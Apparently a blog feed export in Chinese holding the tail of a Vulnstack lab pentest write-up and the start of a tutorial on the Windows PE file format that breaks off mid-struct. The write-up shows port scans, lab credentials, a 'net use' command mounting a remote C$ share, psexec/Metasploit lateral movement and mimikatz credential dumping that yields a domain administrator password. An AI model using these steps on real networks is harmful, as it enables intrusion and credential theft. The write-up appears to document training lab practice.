level: RTM|       Post-SP patches applied: false|     TCP port: 1433|_    Clustered: false2383/tcp  open  ms-olap4?49152/tcp open  msrpc        Microsoft Windows RPC49153/tcp open  msrpc        Microsoft Windows RPC49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49156/tcp open  msrpc        Microsoft Windows RPC49158/tcp open  msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>30机器 - win7</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE25/tcp    open  smtp110/tcp   open  pop3135/tcp   open  msrpc139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49163/tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>存在域 test.org</p><p>这里我还试着看看smb有没有匿名登录，不过都不行</p><h2 id="smb弱口令爆破"><a href="#smb弱口令爆破" class="headerlink" title="smb弱口令爆破"></a>smb弱口令爆破</h2><p>看wp说是win7和win2008的SMB是弱口令<code>administrator:123qwe!ASD</code></p><p>我就懒得爆了，直接用</p><h2 id="psexec-拿下win7、win2008"><a href="#psexec-拿下win7、win2008" class="headerlink" title="psexec 拿下win7、win2008"></a>psexec 拿下win7、win2008</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:123qwe!ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>挂载C盘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use Z: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>c$ /user:administrator 123qwe<span class="token operator">!</span>ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/923db79b42190219ed5eaeaaa4807ee1_MD5.jpeg"></p><p>利用pstools远程连接到win7<br><img src="/Rxi134_FILE/43021cdda9beb03742dba4fc11c39e22_MD5.jpeg"></p><p>利用pstools远程连接到win2008，但是使用pstools是失败的，不知道为啥，使用msf成功了<br><img src="/Rxi134_FILE/b28d4365efa7d86fe1aa9559802139bf_MD5.jpeg"><br><img src="/Rxi134_FILE/e8747a6b72a98571d26cce60f992ee20_MD5.jpeg"></p><p><img src="/Rxi134_FILE/cd1a543929d7096b0f50fab14f6a4357_MD5.jpeg"></p><h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><p>win7：直接上传mimikatz，没抓到域用户<br><img src="/Rxi134_FILE/e9d18372c2df207195eab95b63d653fc_MD5.jpeg"></p><p>win2008：meterpreter自带kiwi模块，导入后抓取密码，得到域控<code>Administrator:zxcASDqw123!!</code><br><img src="/Rxi134_FILE/ef253f78bf8f604afc9a0a0e1ce7c93c_MD5.jpeg"></p><h2 id="登录域控"><a href="#登录域控" class="headerlink" title="登录域控"></a>登录域控</h2><p><img src="/Rxi134_FILE/e6307a2bba195460de3771908d80f6bf_MD5.jpeg"><br><img src="/Rxi134_FILE/350745b6490ea82aff33c210c8763305_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.Portable Executable Format 可移植可执行格式</title>
      <link href="/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/"/>
      <url>/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><strong>Portable Executable (PE)</strong> 是 Windows 系统上可执行文件的文件格式。PE 文件扩展名的几个示例包括 <code>.exe</code>、<code>.dll</code>、<code>.sys</code> 和 <code>.scr</code>。本模块讨论 PE 文件的结构，这对于构建或逆向工程恶意软件非常重要。</p><p>请注意，本模块及未来的模块将经常互换使用“可执行文件”（例如 EXE、DLL）和“镜像”（Images）来指代这些文件。</p><h1 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h1><p>下图展示了一个简化的 <strong>Portable Executable (PE)</strong> 结构。图中显示的每个头部都被定义为一个数据结构，该结构包含关于 PE 文件的信息。本模块将详细解释每个数据结构。<br><img src="/Rxi134_FILE/4671b85da7b3108123c5f23d8748a504_MD5.jpeg"></p><p><img src="/Rxi134_FILE/07427b54f2cd6658fb90b65947539444_MD5.jpeg"></p><h2 id="DOS-头-IMAGE-DOS-HEADER-）"><a href="#DOS-头-IMAGE-DOS-HEADER-）" class="headerlink" title="DOS 头 (IMAGE_DOS_HEADER)）"></a>DOS 头 (IMAGE_DOS_HEADER)）</h2><p>PE 文件的第一个头部总是以两个字节开头，分别是 <code>0x4D</code> 和 <code>0x5A</code>，通常称为 **<code>MZ</code>**。这两个字节代表 DOS 头部的签名，用于确认正在解析或检查的文件是一个有效的 PE 文件。<br><img src="/Rxi134_FILE/bdd280e07e2ab3e4ea79f3a64f88be18_MD5.jpeg"></p><p><strong>DOS 头部</strong> 是一个数据结构，其定义如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DOS_HEADER</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// DOS .EXE header</span>    WORD   e_magic<span class="token punctuation">;</span>                     <span class="token comment">// Magic number</span>    WORD   e_cblp<span class="token punctuation">;</span>                      <span class="token comment">// Bytes on last page of file</span>    WORD   e_cp<span class="token punctuation">;</span>                        <span class="token comment">// Pages in file</span>    WORD   e_crlc<span class="token punctuation">;</span>                      <span class="token comment">// Relocations</span>    WORD   e_cparhdr<span class="token punctuation">;</span>                   <span class="token comment">// Size of header in paragraphs</span>    WORD   e_minalloc<span class="token punctuation">;</span>                  <span class="token comment">// Minimum extra paragraphs needed</span>    WORD   e_maxalloc<span class="token punctuation">;</span>                  <span class="token comment">// Maximum extra paragraphs needed</span>    WORD   e_ss<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) SS value</span>    WORD   e_sp<span class="token punctuation">;</span>                        <span class="token comment">// Initial SP value</span>    WORD   e_csum<span class="token punctuation">;</span>                      <span class="token comment">// Checksum</span>    WORD   e_ip<span class="token punctuation">;</span>                        <span class="token comment">// Initial IP value</span>    WORD   e_cs<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) CS value</span>    WORD   e_lfarlc<span class="token punctuation">;</span>                    <span class="token comment">// File address of relocation table</span>    WORD   e_ovno<span class="token punctuation">;</span>                      <span class="token comment">// Overlay number</span>    WORD   e_res<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment">// Reserved words</span>    WORD   e_oemid<span class="token punctuation">;</span>                     <span class="token comment">// OEM identifier (for e_oeminfo)</span>    WORD   e_oeminfo<span class="token punctuation">;</span>                   <span class="token comment">// OEM information; e_oemid specific</span>    WORD   e_res2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token comment">// Reserved words</span>    LONG   e_lfanew<span class="token punctuation">;</span>                    <span class="token comment">// Offset to the NT header</span>  <span class="token punctuation">&#125;</span> IMAGE_DOS_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DOS_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体中最重要的成员是 <strong><code>e_magic</code></strong> 和 **<code>e_lfanew</code>**。</p><ul><li><strong><code>e_magic</code></strong> 是一个 2 字节的值，固定值为 <code>0x5A4D</code> 或 <strong>MZ</strong>。</li><li><strong><code>e_lfanew</code></strong> 是一个 4 字节的值，保存 NT 头部的起始偏移量。注意，**<code>e_lfanew</code>** 总是位于偏移量 <code>0x3C</code> 处。</li></ul><h2 id="DOS-存根"><a href="#DOS-存根" class="headerlink" title="DOS 存根"></a>DOS 存根</h2><p>在进入 NT 头部结构之前，有一个 <strong>DOS stub</strong>，这是一个错误消息，打印内容为 “<code>This program cannot be run in DOS mode</code>“（该程序无法在 DOS 模式下运行），当程序在 DOS 模式或 “磁盘操作模式” 下加载时会显示此消息。<br><img src="/Rxi134_FILE/9ee4b3e681f049fd506307b7241a8f30_MD5.jpeg"></p><p>值得注意的是，这个错误消息可以由程序员在编译时更改。虽然这不是 PE 头部的一部分，但了解它是有益的。</p><h2 id="NT-头-IMAGE-NT-HEADERS"><a href="#NT-头-IMAGE-NT-HEADERS" class="headerlink" title="NT 头 (IMAGE_NT_HEADERS)"></a>NT 头 (IMAGE_NT_HEADERS)</h2><p>NT 头部非常重要，因为它包含了另外两个镜像头部：<strong>FileHeader</strong> 和 <strong>OptionalHeader</strong>，这两个头部包含了关于 PE 文件的大量信息。</p><p>与 DOS 头部类似，NT 头部也包含一个用于验证的签名成员。通常，签名元素等于字符串 “PE”，其由 <code>0x50</code> 和 <code>0x45</code> 字节表示。但由于签名是 <code>DWORD</code> 数据类型，签名会表示为 <code>0x50450000</code>，虽然被填充了两个空字节，仍然表示为 “PE”。<br><img src="/Rxi134_FILE/944b333c6cedabdb55da4a43db439843_MD5.jpeg"></p><p>NT 头部可以通过 DOS 头部中的成员 <strong><code>e_lfanew</code></strong> 来访问，如图，0xf0 正是 NT头 的偏移<br><img src="/Rxi134_FILE/33058c354ba66ad27a5820d995f0e148_MD5.jpeg"></p><p>NT 头部的结构会根据机器的架构而有所不同。</p><ul><li>32 位版本：<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>  DWORD                   Signature<span class="token punctuation">;</span>  IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>  IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>64 位版本：<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS64</span> <span class="token punctuation">&#123;</span>    DWORD                   Signature<span class="token punctuation">;</span>    IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>    IMAGE_OPTIONAL_HEADER64 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>唯一的区别在于数据结构 <strong><code>OptionalHeader</code></strong> ，是 <strong><code>IMAGE_OPTIONAL_HEADER32</code></strong> 或 **<code>IMAGE_OPTIONAL_HEADER64</code>**，分别用于 32 位和 64 位架构。</p><h3 id="文件头-IMAGE-FILE-HEADER"><a href="#文件头-IMAGE-FILE-HEADER" class="headerlink" title="文件头 (IMAGE_FILE_HEADER)"></a>文件头 (IMAGE_FILE_HEADER)</h3><p>接下来是可以从之前的 NT 头部数据结构访问的头部：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>  WORD  Machine<span class="token punctuation">;</span>  WORD  NumberOfSections<span class="token punctuation">;</span>  DWORD TimeDateStamp<span class="token punctuation">;</span>  DWORD PointerToSymbolTable<span class="token punctuation">;</span>  DWORD NumberOfSymbols<span class="token punctuation">;</span>  WORD  SizeOfOptionalHeader<span class="token punctuation">;</span>  WORD  Characteristics<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最重要的结构体成员是：</p><ul><li><strong><code>NumberOfSections</code></strong> - PE 文件中的段数量（稍后讨论）。</li><li><strong><code>Characteristics</code></strong> - 指定可执行文件某些属性的标志，比如它是否是动态链接库（DLL）或控制台应用程序。</li><li><strong><code>SizeOfOptionalHeader</code></strong> - 后续可选头部的大小。<br>关于文件头部的更多信息可以在官方文档页面中找到。<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">official documentation page</a>.</li></ul><h3 id="可选头部-IMAGE-OPTIONAL-HEADER"><a href="#可选头部-IMAGE-OPTIONAL-HEADER" class="headerlink" title="可选头部 (IMAGE_OPTIONAL_HEADER)"></a>可选头部 (IMAGE_OPTIONAL_HEADER)</h3><p>可选头部非常重要，尽管它被称为 “可选” ，但对 PE 文件的执行至关重要。之所以称它为“可选”，是因为某些文件类型没有这个头部。</p><p>可选头部有两个版本，分别用于 32 位和 64 位系统。两个版本的数据结构几乎相同，主要区别在于某些成员的大小。**<code>ULONGLONG</code>** 用于 64 位版本，**<code>DWORD</code>** 用于 32 位版本。此外，32 位版本中有一些在 64 位版本中不存在的成员。</p><ul><li><p>32 位版本</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  DWORD                BaseOfData<span class="token punctuation">;</span>  DWORD                ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  DWORD                SizeOfStackReserve<span class="token punctuation">;</span>  DWORD                SizeOfStackCommit<span class="token punctuation">;</span>  DWORD                SizeOfHeapReserve<span class="token punctuation">;</span>  DWORD                SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>64位版本</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER64</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  ULONGLONG            ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackCommit<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>可选头部包含了大量有用的信息。以下是一些常用的结构体成员：</p><ul><li><strong><code>Magic</code></strong> - 描述镜像文件的状态（32 位或 64 位镜像）。</li><li><strong><code>MajorOperatingSystemVersion</code></strong> - 所需操作系统的主要版本号（例如 11, 10）。</li><li><strong><code>MinorOperatingSystemVersion</code></strong> - 所需操作系统的次要版本号（例如 1511, 1507, 1607）。</li><li><strong><code>SizeOfCode</code></strong> - 代码段的大小（稍后讨论）。</li><li><strong><code>AddressOfEntryPoint</code></strong> - 文件的入口点偏移量（通常为 <code>main</code> 函数的偏移）。</li><li><strong><code>BaseOfCode</code></strong> - 代码段起始位置的偏移量。</li><li><strong><code>SizeOfImage</code></strong> - 镜像文件的大小，以字节为单位。</li><li><strong><code>ImageBase</code></strong> - 指定应用程序在执行时要加载到内存中的首选地址。然而，由于 Windows 的内存保护机制（例如地址空间布局随机化，ASLR），很少见到镜像映射到其首选地址，因为 Windows PE 加载器会将文件映射到不同的地址。Windows PE 加载器进行的这种随机分配会在实现未来技术时导致问题，因为某些被认为是常量的地址发生了变化。之后，Windows PE 加载器会通过 PE 重定位来修复这些地址。</li><li><strong><code>DataDirectory</code></strong> - 可选头部中最重要的成员之一。它是一个 <strong><code>IMAGE_DATA_DIRECTORY</code></strong> 的数组，包含 PE 文件中的目录（稍后讨论）。</li></ul><h4 id="数据目录-Data-Directory"><a href="#数据目录-Data-Directory" class="headerlink" title="数据目录 Data Directory"></a>数据目录 Data Directory</h4><p>可以通过可选头的最后一个成员来访问数据目录（Data Directory）。该成员是一个 <code>IMAGE_DATA_DIRECTORY</code> 数据类型的数组，其数据结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DATA_DIRECTORY</span> <span class="token punctuation">&#123;</span>    DWORD   VirtualAddress<span class="token punctuation">;</span>  <span class="token comment">// 虚拟地址</span>    DWORD   Size<span class="token punctuation">;</span>            <span class="token comment">// 大小</span><span class="token punctuation">&#125;</span> IMAGE_DATA_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>数据目录数组的大小由常量 <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES</code> 决定，其值为 16。数组中的每个元素表示一个特定的数据目录，包含了某个 PE 节（section）或数据表（Data Table）的一些数据（即存储 PE 具体信息的地方）。</p><p>可以通过数组的索引来访问特定的数据目录：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXPORT</span>          <span class="token expression"><span class="token number">0</span>   </span><span class="token comment">// Export Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_IMPORT</span>          <span class="token expression"><span class="token number">1</span>   </span><span class="token comment">// Import Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_RESOURCE</span>        <span class="token expression"><span class="token number">2</span>   </span><span class="token comment">// Resource Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXCEPTION</span>       <span class="token expression"><span class="token number">3</span>   </span><span class="token comment">// Exception Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_SECURITY</span>        <span class="token expression"><span class="token number">4</span>   </span><span class="token comment">// Security Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_BASERELOC</span>       <span class="token expression"><span class="token number">5</span>   </span><span class="token comment">// Base Relocation Table</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_DEBUG</span>           <span class="token expression"><span class="token number">6</span>   </span><span class="token comment">// Debug Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</span>    <span class="token expression"><span class="token number">7</span>   </span><span class="token comment">// Architecture Specific Data</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_GLOBALPTR</span>       <span class="token expression"><span class="token number">8</span>   </span><span class="token comment">// RVA of GP</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_TLS</span>             <span class="token expression"><span class="token number">9</span>   </span><span class="token comment">// TLS Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</span>    <span class="token expression"><span class="token number">10</span>   </span><span class="token comment">// Load Configuration Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</span>   <span class="token expression"><span class="token number">11</span>   </span><span class="token comment">// Bound Import Directory in headers</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_IAT</span>            <span class="token expression"><span class="token number">12</span>   </span><span class="token comment">// Import Address Table</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</span>   <span class="token expression"><span class="token number">13</span>   </span><span class="token comment">// Delay Load Import Descriptors</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</span> <span class="token expression"><span class="token number">14</span>   </span><span class="token comment">// COM Runtime descriptor</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/4cf8bf30b17a1e800995163d25868ac0_MD5.jpeg"></p><p>下面的两节将简要提到两个重要的数据目录：<strong>导出目录</strong>（Export Directory）和<strong>导入地址表</strong>（Import Address Table）。</p><h5 id="导出目录-Export-Directory"><a href="#导出目录-Export-Directory" class="headerlink" title="导出目录 Export Directory"></a>导出目录 Export Directory</h5><p><img src="/Rxi134_FILE/026f1d5122663a7d45c2801a475d563e_MD5.jpeg"><br>PE 文件的导出目录是一个数据结构，包含关于从可执行文件中导出函数和变量的信息。它包含导出函数和变量的地址，其他可执行文件可以使用这些地址来访问这些函数和数据。导出目录通常存在于导出函数的 DLL 中（例如从 <strong><code>kernel32.dll</code></strong> 中导出 **<code>CreateFileA</code>**）。</p><h5 id="导入地址表-Import-Address-Table"><a href="#导入地址表-Import-Address-Table" class="headerlink" title="导入地址表 Import Address Table"></a>导入地址表 Import Address Table</h5><p><img src="/Rxi134_FILE/9ea33c8f5d1827a9caaab901a53cd8c0_MD5.jpeg"></p><p>导入地址表是 PE 文件中的一个数据结构，包含关于从其他可执行文件导入的函数地址的信息。这些地址用于访问其他可执行文件中的函数和数据（例如从 <strong><code>kernel32.dll</code></strong> 中导入 <strong><code>CreateFileA</code></strong> 到 **<code>Application.exe</code>**）。</p><h2 id="PE-Sections"><a href="#PE-Sections" class="headerlink" title="PE Sections"></a>PE Sections</h2><p>PE 段包含了用于创建可执行程序的代码和数据。每个 PE 段都有一个唯一的名称，通常包含可执行代码、数据或资源信息。PE 段的数量不是固定的，因为不同的编译器可以根据配置添加、删除或合并段。有些段也可以手动添加，因此这个数量是动态的，<code>IMAGE_FILE_HEADER.NumberOfSections</code> 用于确定段的数量。<br><img src="/Rxi134_FILE/7c3ea14466fc67f80d7394551252c0f7_MD5.jpeg"></p><p>以下是最重要的 PE 段，几乎每个 PE 文件中都有这些段：</p><ul><li><strong><code>.text</code></strong> - 包含可执行代码，即编写的代码。</li><li><strong><code>.data</code></strong> - 包含已初始化的数据，即代码中已初始化的变量。</li><li><strong><code>.rdata</code></strong> - 包含只读数据。这些是以 <strong><code>.const</code></strong> 为前缀的常量变量。</li><li><strong><code>.idata</code></strong> - 包含导入表。这些是与代码中调用的函数相关的信息表。Windows PE 加载器使用这些表来确定需要加载到进程中的 DLL 文件，以及每个 DLL 中使用的函数。</li><li><strong><code>.reloc</code></strong> - 包含关于如何修正内存地址的信息，以便程序可以无误地加载到内存中。</li><li><strong><code>.rsrc</code></strong> - 用于存储资源，如图标和位图。<br>每个 PE 段都有一个 <strong><code>IMAGE_SECTION_HEADER</code></strong> 数据结构，包含有关该段的有价值信息。这些结构保存在 PE 文件的 NT 头部下，并且彼此堆叠，每个结构代表一个段。</li></ul><p>回想一下，**<code>IMAGE_SECTION_HEADER</code>** 结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_SECTION_HEADER</span> <span class="token punctuation">&#123;</span>  BYTE  Name<span class="token punctuation">[</span>IMAGE_SIZEOF_SHORT_NAME<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>    DWORD PhysicalAddress<span class="token punctuation">;</span>    DWORD VirtualSize<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> Misc<span class="token punctuation">;</span>  DWORD VirtualAddress<span class="token punctuation">;</span>  DWORD SizeOfRawData<span class="token punctuation">;</span>  DWORD PointerToRawData<span class="token punctuation">;</span>  DWORD 